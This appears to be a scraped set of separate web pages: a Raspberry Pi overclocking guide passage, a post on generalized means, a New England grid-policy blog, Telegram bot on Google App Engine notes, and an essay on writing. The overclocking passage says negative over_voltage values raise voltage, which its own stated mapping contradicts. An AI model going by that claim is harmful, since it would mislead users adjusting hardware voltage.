<blockquote><p>Note: the overclock settings should be below an<strong> [all]</strong> statement, or – even better – below the appropriate selector for your Raspberry Pi, e.g. <strong>[pi4]</strong>. This way, if you share the microSD card between your Pis, the overclocking settings will only be applied to a Pi which can actually use them.  In the screenshot, I’ve pasted the overclocking settings at the end of the file, they are applied to [all] pis.</p><cite>the devil is in the detail</cite></blockquote>



<p>Alternatively, you can also put the overclock.txt in the same folder as the config.txt (FAT partition “boot”, topmost folder), and include it by adding the following line into config.txt:</p>



<pre>include overclock.txt</pre>



<figure><img loading="lazy" width="1024" height="685" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-125-1024x685.png" alt="overclock.txt is being included from the main boot configuration file config.txt" srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-125-1024x685.png 1024w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-125-300x201.png 300w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-125-768x514.png 768w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-125.png 1043w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>including an overclock settings file from the main config.txt boot configuration file</figcaption></figure>



<p>This way, you can keep your settings apart (or even create both medium and high overclocking settings, and switch between them by editing the <em>include </em>line.)</p>



<h3>Step 5 Reboot your Raspberry Pi</h3>



<p>Now your overclocking settings should be applied, and you should feel that the system is snappier &amp; reacts faster. </p>



<p>Stress-test your Raspberry Pi, to see if it will perform appropriately with the new settings! Especially with the maximum overclocking settings, there might be instability or even problems booting your Raspberry Pi – not all Raspberry Pi silicon chips are built alike, and while the stock clock speed settings will work for every Pi, your results might vary when overclocking. </p>



<h2>Monitoring the overclocking stability using PiCockpit</h2>



<p><a href="https://picockpit.com/">PiCockpit </a>is a remote Raspberry Pi monitoring &amp; control web interface. You can add up to five Raspberry Pis free of charge to it.</p>



<p>Using <a href="https://picockpit.com/">PiCockpit</a>, you can monitor important statistics, relevant for overclocking – like CPU load, and SoC temperature. Use the app <a href="https://picockpit.com/raspberry-pi/pistats-live-raspberry-pi-statistics/">PiStats </a>for this purpose: </p>



<figure><a href="https://picockpit.com/"><img loading="lazy" width="722" height="912" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/pistats.jpg" alt="" srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/pistats.jpg 722w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/pistats-238x300.jpg 238w" sizes="(max-width: 722px) 100vw, 722px"></a><figcaption>PiStats shows you a broad range of information for your Raspberry Pi, including the temperature of your CPU (called SoC temperature here), and the CPU load – important for overclocking!</figcaption></figure>



<p> Another very valuable app is <a href="https://picockpit.com/raspberry-pi/pidoctor-raspberry-pi-system-health-monitor/">PiDoctor</a>, which allows you to run health checks on your Raspberry Pi. In PiDoctor’s system module, you’ll see the SoC temperature, the current CPU frequency and voltage (showing you whether your overclocking settings are applied correctly, or if the Pi is operating at reduced speed, as in the screenshot below): </p>



<figure><a href="https://picockpit.com/"><img loading="lazy" width="689" height="935" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/system-throttling-armfrequency-cap-currentlyactive-freq1GHz.jpg" alt="PiDoctor system module shows you vital statistics related to your Raspberry Pi overclocking: the current CPU frequency, the current CPU voltage, the SoC (=CPU) temperature, soft temperature limit, arm frequency cap, throttling, under-voltage." srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/system-throttling-armfrequency-cap-currentlyactive-freq1GHz.jpg 689w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/system-throttling-armfrequency-cap-currentlyactive-freq1GHz-221x300.jpg 221w" sizes="(max-width: 689px) 100vw, 689px"></a><figcaption>The Raspberry Pi in this screenshot is running at lower frequency, due to over temperature (ARM frequency cap is hit)</figcaption></figure>



<p>It will also show you, whether your power supply is too weak (under-voltage). A power supply which might be just good enough for normal operation might not “cut” it anymore for overclocking, since a faster CPU will draw more power. </p>



<h2>FAQ</h2>



<h3>How do I disable overclocking if my Pi does not boot?</h3>



<p>When overclocking, there is a risk of your Raspberry Pi not booting. “Not all silicon is created equal” – there are tolerances in manufacturing. The stock settings will account for these tolerances, with overclocking you can find the maximum settings your Pi will perform at.</p>



<p>In case your Raspberry Pi doesn’t boot after applying the overclock settings, hold down the <strong>SHIFT key </strong>on your keyboard during the next boot. This will disable overclocking – you can boot into your system and adjust (or permanently disable) the overclocking. </p>



<h2>Which applications will benefit from overclocking?</h2>



<p>Typical applications which require a lot of processing power usually include web-browsing, compiling, games.</p>



<h2>What does overclocking actually mean / what does it do?</h2>



<p> The Raspberry Pi’s SoC, which includes the CPU, consists of many millions of transistors. These transistors need to be synchronized with each other, in order to be able to “move in unison”. A common clock speed is applied to this – the clock “ticks” are like commands to little soldiers: “move”, “hold”, “move”, etc. They mark the transition between operating states (for example individual commands being executed on the CPU). This is a gross oversimplification, to give you a rough idea of what is happening. </p>



<p>With overclocking, we ask these transistors to do their work in less time – to switch faster between the individual states. There are physical limits to this, since we’re talking about real atoms which have to perform the work for us. </p>



<p>Furthermore, as electric signals travel at finite speeds, synchronisation between transistors (or on a higher level, functional units) needs to happen across the SoC – if the clock speed is too fast, these signals can’t propagate properly, the individual functional units aren’t synchronized, the CPU crashes. </p>



<p>Imagine this as a very long trail of soldiers which are marching in a parade. If there are some in the back which march a bit faster, and they don’t get to synchronize, they will bump into the rows ahead of them eventually, disrupting the whole parade. Or if they march slower than the ones ahead, they will loose touch with their comrades – the whole parade will become chaotic. Therefore, a clock speed (marching speed) has to be found which works for all soldiers (all functional blocks). </p>



<p>In reality, this is a bit more complex, since functional blocks on the Raspberry Pi SoC  are somewhat independent, and can even operate at their own clock speeds. There are further constraints, for example HDMI 4K output will require different speeds on the Pi 4, etc.  </p>



<h3>Which config.txt settings are available for overclocking?</h3>



<p><a href="https://www.raspberrypi.org/documentation/configuration/config-txt/overclocking.md">This Raspberry Pi page has all the details for overclocking options in config.txt</a>.</p>



<p>Here’s an excerpt of the most important ones:</p>



<ul><li><strong>arm_freq </strong>– the frequency you would like the CPU to run at. If force_turbo is not enabled, this is simply the top frequency the CPU will perform at – it will reduce the frequency dynamically, if no heavy workload is placed on it. The top frequency you can overclock your Raspberry Pi to will vary by model, and by the actual Raspberry Pi you’re using – some will allow more overclocking, some will allow less</li><li><strong>over_voltage</strong> – this will increase voltage to the CPU/GPU core. It will be in the range of [-16, 8], which maps to [0.8V, 1.4V (actual CPU voltage)] with 0.025V steps. Note – negative values will not under voltage your CPU, but actually over voltage it. Values above 6 are only allowed if force_turbo is specified; setting over_voltage and force_turbo together sets the warranty bit.</li><li><strong>temp_limit</strong> – overheating protection. It is set to the maximum, 85°C by default. When the Raspberry Pi CPU hits that temperature,  the clocks and voltages will be set back to their default values to protect your Raspberry Pi. Adjust this to lower values if you feel uncomfortable with your Pi running too hot.  </li><li><strong>force_turbo</strong> – will force the top frequency, even when it is not required as per the ARM core’s workload. Usually, you’ll find this in the maximum performance …</li></ul></div></article></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			<p>In school, we are first taught the arithmetic mean, then later the geometric mean, and maybe one or two others like the harmonic/contraharmonic mean.</p>
<p>But most teachers do not teach the logic or derivation behind these means. They merely provide the formulas and perhaps provide some scenarios where each mean would be more useful than the others.</p>
<p>I’d like to illustrate the definition of a mean, in the most abstract sense, from a programmer’s perspective, an algorithmic point of view.</p>
<h2>A Balancing Act</h2>
<hr>
<p>Suppose we have a list of N numbers, and a binary operation $f(a,b)$</p>
<p>If we apply that binary operation to one number from the list, we must&nbsp;apply its inverse operation to another number from the list.</p>
<p>We can continue applying $f$ to one element then $f^{-1}$ to another element as many times as we need to, until every number in the list is equal. That number that all elements are equal to…is the mean!</p>
<p>Means are just balancing acts!</p>
<p>** I am aware we haven’t specified the most&nbsp;optimized way to perform this algorithm to ensure it halts.</p>

<h2>Example</h2>
<hr>
<p>let our list be $(2,4,6)$ and our $f(a,b)=a+b$</p>
<p>then we apply the operation and its inverse to two elements respectively:</p>
<p>$(f(2,2), 4 ,f^{-1}(6,2)) = (2+2, 4 ,6-2) =&nbsp;(4,4,4)$</p>
<p>So our mean is 4.&nbsp;We just performed the&nbsp;<em>arithmetic mean</em>!</p>

<h2>What is it good for?</h2>
<hr>
<p>Well, given ANY invertible&nbsp;symmetric binary function, we can define a mean and derive its “shortcut” formula!</p>
<p>Here are the functions that define the means we usually come across:</p>
<p>arithmetic mean: $f(a,b) = a+b$<br>
geometric mean: $f(a,b) = ab$<br>
geometric mean (alternative definition): $f(a,b) = ln(a) + ln(b)$<br>
harmonic mean: $f(a,b) = 1/(1/a + 1/b)$</p>

<h2>Favoring Large or Small Numbers</h2>
<hr>
<p>Now, most of us learn that geometric mean tends to favor smaller&nbsp;numbers.</p>
<p>For example, the arithmetic mean of 1&nbsp;and 100 is $50\frac{1}{2}$. But the geometric mean of 1 and 100 is 10.</p>
<p>Knowing what we do now, can we create a mean that favors smaller numbers&nbsp;even more?</p>
<p>I don’t know if these already exist in the formal mathematics universe, ie. books or published papers. So let me know if you find a previous name for them!</p>
<p>Franken-mean: $f(a,b) = a^b b^a$</p>
<p>Franken-mean v2: $f(a,b) = a^b + b^a$</p>
<p>You might ask if we can skew our mean toward smaller numbers&nbsp;even more than our above exponential mean. We sure can. Using something called Tetration, simply put – it is iterated exponentiation. There are even operations that encompass iterated tetration and so on…these kind of operations are called&nbsp;hyperoperations. So we can make a mean skewed toward lows or highs as much as we want, and it’s beautiful isn’t it? Before different means are taught, the theory of what defines a mean should really be taught.</p>
<p>But before I forget,&nbsp;you must be saying: “Where’s my shortcut formulas?!!”</p>
<p>Okay okay.</p>

<h2>Deriving the Closed Formulas</h2>
<hr>
<p>Let’s derive the arithmetic mean first. Assume we have a list of 4 elements, ${x,y,z,t}$</p>
<p>Given the binary symmetric&nbsp;function that defines the arithmetic mean $f(a,b)=a+b$,</p>
<p>we let $g(a) = f(a,f(a,f(a,a))) = a + a + a + a = 4a$</p>
<p>Our formula for the mean of the 4 numbers in our list will be:</p>
<p>$g^{-1}(f(x,f(y,f(z,t))))$</p>
<p>We know $g(a) = 4a$, so $g^{-1}(a) = a/4$</p>
<p>That means our mean is $(x+y+z+t)/4$, which is what we expected from the arithmetic mean</p>
<p>Above was just a demonstration for a fixed size list of 4 elements. The concept is the same for any sized list. We can use induction to extrapolate what the formula will be for a list of n&nbsp;elements, $(x+y+z+t…….+w)/n$</p>

<h2>Mathematica code for the generalized mean</h2>
<hr>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
InverseFunction[
(Fold[f, ConstantArray[#, Length[l]]]) &amp;
] [Fold[f, l]]
);
</code></pre>
<ul>
<li>Arithmetic Mean
<pre id=""><code>In:= GeneralizedMean[{x,y,z,t},(#+#2)&amp;]
Out= 1/4 (t+x+y+z)</code></pre>
</li>
<li>Geometric Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (#*#2) &amp;]
Out= (t x y z)^(1/4)
</code></pre>
</li>
<li>Harmonic Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (1/(1/# + 1/#2)) &amp;]
Out= 4/(1/t + 1/x + 1/y + 1/z)
</code></pre>

<li>Franken Mean v1
<pre id=""><code>In:= GeneralizedMean[{x, y}, (#^#2 * #2^#) &amp;]
Out= Log[x^y y^x]/(2 ProductLog[1/2 Log[x^y y^x]])
</code></pre>
</li>
</ul>
<p>I had to use 2 variables for the above, because Mathematica’s symbolic inverses aren’t strong enough.<br>
Franken Mean v2 does not even compute with symbolics or even numbers.<br>
I will eventually work on this to hopefully get at least numerics to work nomatter what.</p>
<h2>Alternative Implementation</h2>
<hr>
<p>This is an alternative implementation which seems to yield better results in some cases:</p>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
Module[{x},
Solve[Fold[f, l] == Fold[f, ConstantArray[x, Length[l]]], x][[-1,
1, 2]]
]);
</code></pre>

<h2>Create your own means!</h2>
<hr>
<p>Enjoy creating your own means! Number theoretic means on lists of primes and that sort of stuff should be very interesting to explore, cheers!</p>

<p><em>P.S.</em></p>
<p>Kolmogorov actually did something similar and came up with what’s called the <a href="https://en.wikipedia.org/wiki/Quasi-arithmetic_mean">Generalized f-mean</a></p>
<p>But he restricted his construct to only functions of the form $f(a,b) = g(a) + g(b)$, where g is the function that determines the mean and is to be specified.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<h4>Winter Weather</h4>
<p>As I wrote in <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting the Grid</em></a>, the quest for reliable electricity in the winter in New England is far more difficult than it needs to be. The root of the problem is the FERC (Federal Energy Regulatory Commission) rules for areas like New England. This area is organized on the <a href="https://www.eia.gov/todayinenergy/detail.php?id=790">RTO system</a>&nbsp; &nbsp;and the FERC rules for RTOs are not particularly concerned with reliable electricity. &nbsp;The rules are very concerned with “fuel neutrality.” In other words, it doesn’t seem to matter if we have rolling blackouts in winter in New England, as long as the rules that <em>led</em> to the rolling blackouts were fair to everyone. The rules especially have to be fair to all the different types of fuels and generators.</p>
<p>Of course, “fair to everyone” is in the eyes of the beholder.</p>
<h4>Local Attempts to Encourage Winter Reliability, Despite FERC</h4>
<p>I document many of the RTO winter problems in <em>Shorting the Grid</em>. ISO-NE, our grid operator, set up the early Winter Reliability Programs. These programs worked well to provide reliability for the grid by making sure gas-fired plants had oil on hand when they couldn’t obtain gas on cold days. Then FERC shut down that program as not being fuel-neutral. In response, ISO-NE suggested a complex formula of fines and rewards, Pay for Performance, to substitute for the Winter Reliability Program. It was approved by FERC, but it failed, financially, within four months of being implemented. &nbsp;Then came the Inventoried Energy plan. &nbsp;That got implemented, on top of the Pay for Performance plans. &nbsp;Next, ISO suggested three new auctions which I reviewed in my book, and I said they would not work. As it happens, these three auctions did not get formally presented to FERC.</p>
<p>Now we get beyond the material presented in <em>Shorting the Grid</em>, because books have a lag time to publication. After ISO-NE set aside the three auctions reviewed in my book, ISO-NE proposed <a href="https://www.utilitydive.com/news/iso-ne-commits-to-address-regional-energy-security-challenges-as-ferc-rejec/588616/?fbclid=IwAR3nrqCXvC9IDbkcFqq2alaXrfCxRTqvJJpKObQP2Wdq5jaJDF10FRDn4sY">three differerent new auctions</a> for FERC approval. &nbsp;Those auction plans were turned down by FERC on October 31 of this year. In the most recent news,<a href="https://rtoinsider.com/iso-ne-to-ferc-fuel-security-179295/"> ISO-NE is asking FERC</a> for guidance in setting up a program which will <em>meet</em> FERC’s fuel-neutral criteria, and still <em>provide</em> reliable electricity in winter in the Northeast. &nbsp;If such a thing can actually be done.</p>
<h4>What Kind of Rock?</h4>
<p>In other words, since FERC seems to turn down any ISO-NE program that might work, maybe FERC can suggest a program? A friend of mine who is retired from the Navy suggested that FERC has been giving orders that are the equivalent of “Get me a rock.” What kind of rock? How big? Round or jagged? Those issues aren’t addressed. As far as I can tell, leadership training in the Navy includes “Don’t give ‘get me a rock’ orders.” Maybe FERC needs a little training?</p>
<p>Despite the lag time required by book publication, <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting</em></a> is still basically up to date. This latest three-auction go-around was predictable to anyone who read my book. The RTO system can’t solve even simple problems of reliability, which is how I started the tale of <em>Shorting</em>, and where I will end this blog post.</p>
<hr>
<p>The great thing about a blog post is that people can comment and start a conversation. Often, I learn important things from my readers.</p>
<p>If you haven’t read <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting the Grid</em></a>, let me encourage you to buy it. If you have read it, let me encourage you to leave a review on Amazon. Amazon decides which books to feature based on the number of reviews, or so I am told. Your review is a sort of gift to me. Thank you.</p>

<p>I want to be notified about new real estate ads from my neighborhood.</p>

<h2 id="context">Context</h2>

<ul>
  <li>There’s a popular real estate ads portal I currently check every now and then to get the “feel” of the market I’m interested in. I want to <em>outsource</em> the checking to a bot and be notified about new ads.</li>
  <li>This is for curiosity and to track price trends. I don’t need to know about every new ad. I’m interested only in ads matching certain criteria. I don’t need to be notified right away — once a day, maybe even once a week is OK.</li>
  <li>This is a hobby project, hosting price, educational value, and developer happiness are important and legitimate concerns for the solution 😀</li>
</ul>



<ol>
  <li>
    <p><strong>Write a telegram bot to scrape the ads portal and send notifications about new ads matching the given criteria.</strong></p>

    <ul>
      <li>I use telegram for some group chats and it’s already present on my phone.</li>
      <li>It has a nice <a href="https://core.telegram.org/bots/api" title="Telegram Bot API">bot API</a>.</li>
      <li>A user/bot can mark messages they send as <em>silent</em> so they don’t distract the recipient.</li>
    </ul>
  </li>
  <li>
    <p><strong>Write the bot with go.</strong></p>

    <ul>
      <li>I’m involved in some go projects at work, and I feel quite productive with the language.</li>
      <li>Small backend services are the sweet spot for go.</li>
      <li>I’ve contributed to some go projects, but starting from scratch is a different game. I’ve wanted to practice that.
        <ul>
          <li>I’ve ignored <a href="https://github.com/go-telegram-bot-api/telegram-bot-api">go-telegram-bot-api/telegram-bot-api</a>. Writing the API model from scratch is a bit of work, but I wanted to do that for educational purposes (see <a href="https://blog.codinghorror.com/dont-reinvent-the-wheel-unless-you-plan-on-learning-more-about-wheels/"><em>Don’t Reinvent The Wheel, Unless You Plan on Learning More About Wheels</em></a>).</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Host the bot on Google App Engine (GAE) in the Google Cloud (GCP).</strong></p>

    <ul>
      <li>I don’t want to run the bot on my laptop, and I don’t want to maintain the server at home. We need to go to the CLOUD! 🌥
        <ul>
          <li>Of course, we can also host a VM on digital ocean (or somewhere similar) for $5 / month ;).
            <ul>
              <li>Sidenote: If you want to try digital ocean <a href="https://m.do.co/c/649b18bb5e59">my ref link</a> will give you $100 credits to start (over 60 days; and $25 for me).</li>
            </ul>
          </li>
          <li>I wanted to use a managed solution though, mostly to avoid maintenance work on the project as much as possible.</li>
        </ul>
      </li>
      <li>Why Google App Engine and not Heroku, or Azure/AWS equivalents?
        <ul>
          <li>Mostly to get more hands-on experience with GCP.</li>
          <li>They have a <a href="https://cloud.google.com/free" title="GCP free tier">generous free tier</a> and I expect my use case to fit into the limits and cost me $0 / month (or close to it).</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h2 id="why-not-open-source-the-code">Why not open-source the code?</h2>

<p>Because of the website I’m scraping. The laws on the subject are complex, scraping for personal purposes is different than showing the public how to do it. I don’t want to go through the hassle of figuring it out in the major jurisdictions. I could take out the scraping part and open-source the rest, but for now, I’m not willing to put more personal time into the project.</p>

<p>I hope you’ll find the notes useful regardless!</p>



<h2 id="telegram-bot-api-is-really-good-for-experimentation">Telegram bot API is really good for experimentation</h2>

<p>The docs are really good and easy to work with. There’s no tutorial, so I recommend to use VS code + <a href="https://marketplace.visualstudio.com/items?itemName=humao.rest-client">REST client extension</a> to experiment. This is useful later on when you try to debug or understand the API a bit better. The REST client gives us a nice, interactive, almost REPL like dev-experience.</p>

<ol>
  <li>
    <p>Talk to <em>BothFather</em> on telegram to create a new bot: <a href="https://core.telegram.org/bots#3-how-do-i-create-a-bot">[docs]</a>.</p>
  </li>
  <li>
    <p>Start with the following requests:</p>
  </li>
</ol>

<pre><code>@token = token-from-botfather
@root = https://api.telegram.org/bot


### Info
GET /getMe


### Get new messages sent to the bot
GET /getUpdates


### Respond back to a chat
@chat_id = numeric-chat-id
POST /sendMessage?chat_id=&amp;text=Hello


### Check webhook status
GET /getWebhookInfo
</code></pre>

<p><img src="https://kupczynski.info/static/img/posts/2020-11-telegram-bot-api-experiments.png" alt="VS code REST client session example"></p>

<h3 id="anyone-can-chat-to-your-bot">Anyone can chat to your bot</h3>

<p>You may want some form of authentication before allowing telegram users to use all the bot features. In my case, I ask for a user token in order for the bot to notify you about new ads.</p>

<h2 id="google-app-engine">Google App Engine</h2>

<p>I’ve really enjoyed working with the platform. There’s a learning curve, but there’s not a lot of complexity if you think about it as a docker container runner :)</p>

<h3 id="secrets-are-hard-to-manage">Secrets are hard to manage</h3>

<p>As a responsible <a href="https://12factor.net/config">twelve-factor app</a> citizen you want to provide the config, including secrets, via environment variables. On GAE you put them in <code>app.yaml</code> file. The problem is that you can’t keep the file plaintext in your repo — everyone with access to the code will be able to access the secrets as well.</p>

<p>See, e.g.  <a href="https://cloud.google.com/appengine/docs/standard/go/sending-messages">https://cloud.google.com/appengine/docs/standard/go/sending-messages</a></p>

<blockquote>
  <p>Add the key to the environment variables section in your app’s&nbsp;app.yaml</p>
</blockquote>

<blockquote>
  <p>Note that anyone with access to your app.yaml will also have access to your API keys. If you can’t store app.yaml in a secure location, we recommend you store the API keys in a secure location such as Datastore and retrieve the keys at runtime, or keep the keys in your code but encrypt them with a keystore, such as Cloud Key Management Service.</p>
</blockquote>

<p>This is a far cry from the ease of adding “secret” env variables in other services. E.g. adding secrets to GitHub Actions is just a few clicks in the UI.</p>

<p>The alternative is to use something like <a href="https://www.agwa.name/projects/git-crypt/">gitcrypt</a> to transparently encrypt the file in your repo.</p>

<p>Remember, we talk about a personal time hobby project, not an <em>enterprise</em> deployment where secret management is likely a solved problem.</p>

<h3 id="if-you-dont-know-gae-start-with-the-concepts">If you don’t know GAE start with the <em>concepts</em></h3>

<p>See https://cloud.google.com/appengine/docs/standard/go/concepts, especially the <em>How Instances are Managed</em> section.</p>

<h3 id="run-it-for-cheap-">Run it for cheap :)</h3>

<p><strong>Note</strong> when I comment on pricing in this article it is based on my understanding of the GCP price model. Cloud pricing models are notoriously complex — do your own research, utilize the GCP trial to figure out the costs of your project. Don’t blindly follow the advice of some random-person-on-the-internet.</p>

<p>At the time of writing GAE free tier looks like this <a href="https://cloud.google.com/free" title="GCP free tier">[src]</a>:</p>
<pre><code>- 28 hours per day of "F" instances
- 9 hours per day of "B" instances
- 1 GB of egress per day
- The Free Tier is available only for the Standard Environment
</code></pre>

<p>Put something like this in the <code>app.yaml</code> config file to stay within the limits:</p>
<pre><code>instance_class: F1
automatic_scaling:
  max_instances: 1
</code></pre>

<h3 id="old-versions-of-the-app-may-be-still-running">Old versions of the app may be still running</h3>

<p>When you do <code>gcloud app deploy</code> GCP build and deploys new version of your app. The problem is that the old versions may be still running. Unless you do traffic splitting they probably get 0 traffic, but they may serve existing connections, or they may do some operations in the background. Keep that in mind, delete the old versions when you don’t need them (and avoid async operations, GAE is not designed for that, see <a href="#go-concurrency-patterns-are-not-that-useful"><em>Go concurrency patterns are not that useful</em></a> section).</p>

<p><img src="https://kupczynski.info/static/img/posts/2020-11-gae-old-versions-still-running.png" alt="Old versions still running"></p>

<h3 id="the-app-is-not-guaranteed-to-scale-up-from-0-to-1-after-deployment">The app is not guaranteed to scale up from 0 to 1 after deployment</h3>

<ul>
  <li>Watch out for any init actions — your app may not be started until it gets the first request.</li>
  <li>If there are 0 instances pre-deployment, google may keep it a 0 post-deployment.</li>
  <li>
    <p>The <a href="https://cloud.google.com/appengine/docs/standard/go/how-instances-are-managed#instance_states">docs say that an instance is always running</a>, but I don’t think that’s the case:</p>

    <blockquote>
      <p>An instance of an auto-scaled service is always running. However, an instance of a manual or basic scaled service can be either running or stopped.</p>
    </blockquote>
  </li>
</ul>

<p><img src="https://kupczynski.info/static/img/posts/2020-11-0-instances-runnning.png" alt="No instances running"></p>

<h3 id="dont-forget-to-clean-up-the-lingering-images">Don’t forget to clean up the lingering images!</h3>

<p><a href="https://cloud.google.com/appengine/docs/standard/go/testing-and-deploying-your-app">[docs]</a></p>

<blockquote>
  <p>Each time you deploy a new version, a container image is created using the Cloud Build service. That container image then runs in the App Engine standard environment. (…) Once deployment is complete, App Engine no longer needs the container images. Note that they are not automatically deleted, so to avoid reaching your storage quota, you can safely delete any images you don’t need.</p>
</blockquote>

<p>The images are stored in a Google Cloud Storage bucket. Actually, I’ve noticed that GCP created two new buckets, one of them had a 15d lifecycle policy attached, but the other not.</p>

<h3 id="the-built-in-observability-tools-are-really-good-at-least-for-a-personal-project">The built-in observability tools are really good (at least for a personal project)</h3>

<ul>
  <li>
    <p>Logs: there’s a generous 50GB / project free tier for logs as long as you stay within the default retention period (30 days). See <a href="https://cloud.google.com/stackdriver/pricing">[pricing]</a>.</p>
  </li>
  <li>
    <p>Traces to profile the app.</p>

    <p>As you can see on the screenshot there’s not that much to my app. You can see the histogram, with long-running requests easily distinguishable over the 1000 ms line. It’s not that I have 5-sec behemoths in the bot, but rather there were 0 instances, and GCP needed to start one for me to serve the request.</p>

    <p>I’m not sure how useful this is for a small personal “app” but it doesn’t hurt to have it, you can easily eyeball if there’s anything that takes longer than expected.</p>

    <p><img src="https://kupczynski.info/static/img/posts/2020-11-traces.png" alt="Traces"></p>
  </li>
  <li>
    <p>Debugger</p>

    <p>The debugger is really amazing on paper, but I couldn’t get it to work. Based on the docs it is not available for Go in GAE <a href="https://cloud.google.com/debugger/docs/setup/go">[src]</a>.</p>

    <p><img src="https://kupczynski.info/static/img/posts/2020-11-debugger.png" alt="Debugger no game"></p>
  </li>
</ul>

<h2 id="structuring-the-app">Structuring the app</h2>

<h3 id="go-concurrency-patterns-are-not-that-useful">Go concurrency patterns are not that useful</h3>

<p>Due to autoscaling our app may be scaled-down anytime when it is not servicing requests. This means that we can’t rely on goroutines (and channels) to complete operations in the background.</p>

<p>A GAE app should be based on the request-response model. It gets a request, does the processing, and responds to the request.</p>

<p>On the other hand, we prefer to respond to customer requests right away and queue the heavy lifting for async processing (see <a href="https://decafbad.com/blog/2008/07/04/queue-everything-and-delight-everyone/"><em>Queue everything and delight everyone</em></a>).</p>

<p>GCP provides us with primitives to compensate the lack of async processing. We can use <a href="https://cloud.google.com/tasks/docs/dual-overview"><em>task queues</em></a> and <a href="https://cloud.google.com/appengine/docs/standard/go/scheduling-jobs-with-cron-yaml"><em>cron jobs</em></a>.</p>

                    <h2>Writing as a medium</h2>
<p>I never have even in my wildest dream thought of what it meant to write.
I have always thought that writing is nothing more than putting together some useful information for an article. Or that writing is just a way to express yourself.</p>
<p>Basically, I have though in clingy cliches. </p>
<p>That was the main reason that I have never considered writing as a side thing that I wanted to do. Writing has always been reserved in my mind for those that went and did linguistics, English language or history in the university.</p>
<p>I have always been put together with mathematicians and scientists. After all, I went to study economics at University. Even though it did involve some essays, most of it was about mathematics and statistics.</p>
<p>So, can you imagined how I was surprised when I have seen countless people pick up writing and start blogging and journaling?</p>
<p>I asked them, “Why not Instagram with images and videos? Why not YouTube with full vlogs?” At that point, I had no idea what they were doing and why.</p>
<p>At that point in my life, I preferred content in video formats, maybe because I understood it better, or maybe because I thought that only the best-written content would be made into a video. So that is the reason why I was shocked when they told me also to start writing. “You will understand once you start.” Of course, I completely ignored them.</p>
<p>Now 4 years later and here I am writing for you to consume information in the format that was unavailable to 90% of the population of earth up until 200 years ago.</p>
<p>The biggest benefit of writing and blogging, in general, is that it can seamlessly include and format out there organically. It can include photos, videos, sound and text, all together with no real friction.</p>
<p>In any other medium, that is impossible. Videos come close, but if you make people read something for 3 minutes straight on the video, they will get annoyed, and there will be friction.</p>
<p>The other most amazing things about writing is that it has a tremendous benefit to the writer.</p>
<p><img alt="writing with pen" src="https://i.gyazo.com/644a347f76eff5fe417ecd9dfbb00b14.jpg"></p>
<h2>Writing sorts out your thoughts</h2>
<p>If you have never written anything, you wouldn’t understand this, but once you have a topic in mind and you start the writing process, countless thoughts appear in your head. They are all considered and put on to the surface for you to pick. Those thoughts allow you to continue writing and creating the article itself.</p>
<p>Our thoughts and brain, of course, think and process information much faster than we write. Even if you write 300 words per minute. That forces you to choose and pick the best thoughts and ideas available so that the structure is clean and balanced. What ends up happening is that irrelevant and unpicked thoughts get put into the large box that says “Irrelevant” and from then on, whenever the topic in hand gets brought up, only the used thoughts will be used. The box will remain shut.</p>
<p>Not only that, but they will be used exactly like you have written them down.</p>
<p>How is that a benefit? Well, in a word of information overdoes, having a structured thought process and balanced understanding of the topic is very hard. We all know something about everything; in reality, that is useless. Not only it makes us falsely think that we know somethings perfectly, but it also makes us thinks that we know everything perfectly.</p>
<p>Every time a topic gets brought up, our brain first reaction will be to share what we know about it to show off. When you try though to tell what exactly you know, instead of a good understanding, only blobs of some definitions come up. Your explanation barely scratches the surface.</p>
<p>Most of the time, when trying to explain a topic that we are only barely familiar with, our sentence structure is not that good, and we are not able to have logic in them.</p>
<p>Well, what does writing do? <a href="https://klimy.co/blog/being-honest-or-being-successful">It forces you to understand the topic</a> from 0% and at least to 50% of the topic. This allows you actually to know what you are talking about. Once you put something into writing, you have a clear picture of what it is and how it works.</p>
<h2>Writing helps you being creative</h2>
<p>If you have never done writing, you probably won’t understand, but while writing, you will be getting the best creative solutions to all of the problem you have ever had. </p>
<p>If something is <a href="https://klimy.co/blog/quality-over-quantity-in-writing">really bothering you so much that you are not able to do anything;</a> in my opinion, you should get a pen and paper or a text editor and start writing. </p>
<p>The writing doesn’t even have to be about your problem. It can be about anything. You are doing it for the process, not the outcome. You will be surprised, but while writing and being absorbed, you will think of countless solutions to your problem. </p>
<p>Even if you think that creativity is not your strong suit, you would be surprised how much inspiration is surrounding us. A bird that you barely saw on the street can be a head image for the brand that you are working on. A song that you heard on the radio can be the base for your hit of the year. Anything that surfaces in your head while writing is going to be gold, as long as you take and use it.</p>
<p><img alt="laptop and book open for writing" src="https://i.gyazo.com/6392f4a679a6e85f8acb46a5b5bcf0b9.jpg"></p>
<h2>Writing lets you dream</h2>
